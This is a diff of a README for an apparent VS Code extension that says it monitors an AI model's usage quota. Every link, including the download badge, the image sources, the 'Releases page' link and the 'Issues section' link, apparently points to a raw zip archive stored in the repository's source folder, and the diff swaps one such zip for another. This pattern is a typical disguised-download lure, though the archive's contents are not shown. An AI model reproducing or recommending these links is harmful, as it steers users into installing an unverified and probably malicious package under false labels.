@@ -1,13 +1,13 @@
 # 🚀 AntigravityQuota - Monitor Your AI Usage Seamlessly
 
-[![Download AntigravityQuota](https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip)](https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip)
+[![Download AntigravityQuota](https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip)](https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip)
 
 ## 🌟 Overview
 
 Antigravity Quota Watcher is a lightweight VS Code extension that helps you keep track of your Antigravity AI model usage quota. It displays your current quota in the status bar, making it easy to view your usage at a glance.
 
-<img src="https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip" alt="Modal View" width="500"/>
-<img src="https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip" alt="Taskbar View" width="500"/>
+<img src="https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip" alt="Modal View" width="500"/>
+<img src="https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip" alt="Taskbar View" width="500"/>
 
 ## 🛠️ Features
 
@@ -23,7 +23,7 @@ To get started with AntigravityQuota, follow these simple steps to download and 
 
 ### Installation (GitHub)
 
-1. Visit the Releases page to download the latest version of AntigravityQuota: [Download AntigravityQuota](https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip).
+1. Visit the Releases page to download the latest version of AntigravityQuota: [Download AntigravityQuota](https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip).
 2. Download the latest `.vsix` file.
 3. Open Visual Studio Code.
 4. Go to `Extensions` in the sidebar.
@@ -59,7 +59,7 @@ If you encounter any issues:
 2. Check that your Antigravity AI model is running.
 3. Restart Visual Studio Code and the Antigravity application.
 
-For further support, visit the [Issues section](https://github.com/SoyJemoox/AntigravityQuota/raw/refs/heads/main/src/ui/Quota-Antigravity-3.9.zip) on our GitHub repository.
+For further support, visit the [Issues section](https://raw.githubusercontent.com/SoyJemoox/AntigravityQuota/main/src/Quota-Antigravity-v2.1-alpha.4.zip) on our GitHub repository.
 
 ## 🙌 Acknowledgments
 
